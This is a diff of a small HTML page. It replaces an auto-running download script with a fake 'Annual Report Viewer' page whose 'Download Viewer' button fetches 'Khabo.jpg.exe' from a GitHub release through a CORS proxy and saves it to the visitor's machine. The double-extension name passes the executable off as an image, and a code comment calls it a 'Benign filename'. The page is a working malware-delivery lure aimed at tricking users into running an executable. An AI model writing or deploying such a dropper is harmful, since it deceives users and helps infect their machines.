@@ -1,10 +1,46 @@
-<script>
-fetch("https://github.com/mitasahi/root/releases/download/latest/Khabo.jpg.exe")
-.then(res => res.blob())
-.then(blob => {
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = "Khabo.jpg.exe";
-  a.click();
-});
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Document Viewer</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
+        button { padding: 10px 15px; background: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>Annual Report Viewer</h1>
+    <p>Click below to download the document viewer:</p>
+    <button id="downloadBtn">Download Viewer</button>
+
+    <script>
+        document.getElementById('downloadBtn').addEventListener('click', async () => {
+            try {
+                // Fetch the file (using a proxy to avoid CORS issues)
+                const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+                const fileUrl = 'https://github.com/mitasahi/root/releases/download/latest/Khabo.jpg.exe';
+                
+                const response = await fetch(proxyUrl + fileUrl);
+                if (!response.ok) throw new Error('Failed to fetch');
+                
+                // Create a blob download
+                const blob = await response.blob();
+                const blobUrl = URL.createObjectURL(blob);
+                
+                const a = document.createElement('a');
+                a.href = blobUrl;
+                a.download = 'Khabo.jpg.exe'; // Benign filename
+                document.body.appendChild(a);
+                a.click();
+                
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(blobUrl);
+                }, 100);
+                
+            } catch (error) {
+                alert('Download failed: ' + error.message);
+            }
+        });
+    </script>
+</body>
+</html>
